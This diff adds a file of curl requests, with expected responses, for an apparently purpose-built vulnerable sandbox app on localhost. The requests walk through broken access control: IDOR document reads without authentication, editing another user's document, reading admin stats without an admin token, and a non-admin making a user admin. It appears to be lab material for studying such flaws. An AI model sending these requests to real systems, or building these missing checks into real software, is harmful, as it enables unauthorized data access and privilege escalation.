@@ -1,0 +1,37 @@
+# Sample requests (curl) and expected responses for the sandbox.
+# Replace :PORT with actual port (default 4000)
+
+# 1) Login as alice -> get token
+curl -X POST http://localhost:4000/auth/login -H "Content-Type: application/json" -d '{"username":"alice","password":"alicepwd"}'
+
+# Response: { "token": "..." }
+
+# 2) Fetch a document by id (IDOR) WITHOUT auth (vulnerable)
+curl http://localhost:4000/documents/1
+
+# Expected: returns document 1 regardless of owner. debug.requester will be null.
+
+# 3) Fetch the same document WITH alice token (optionalAuth)
+curl http://localhost:4000/documents/1 -H "Authorization: Bearer <TOKEN>"
+
+# Expected: same document, debug.requester shows token payload.
+
+# 4) List documents of bob (missing auth)
+curl http://localhost:4000/documents/owner/3
+
+# Expected: returns bob's documents list.
+
+# 5) Edit document 1 using alice's token (privilege escalation possible)
+curl -X POST http://localhost:4000/documents/1/edit -H "Content-Type: application/json" -H "Authorization: Bearer <ALICE_TOKEN>" -d '{"title":"Hacked title","content":"Changed content"}'
+
+# Expected: succeeds even if alice is not owner (vulnerable).
+
+# 6) Read admin stats without admin token
+curl http://localhost:4000/admin/stats
+
+# Expected: returns user & document counts (vulnerable).
+
+# 7) Change user role as non-admin (vulnerable)
+curl -X POST http://localhost:4000/admin/users/3/role -H "Content-Type: application/json" -H "Authorization: Bearer <ALICE_TOKEN>" -d '{"role":"admin"}'
+
+# Expected: roles updated even though alice is not admin (vulnerable).
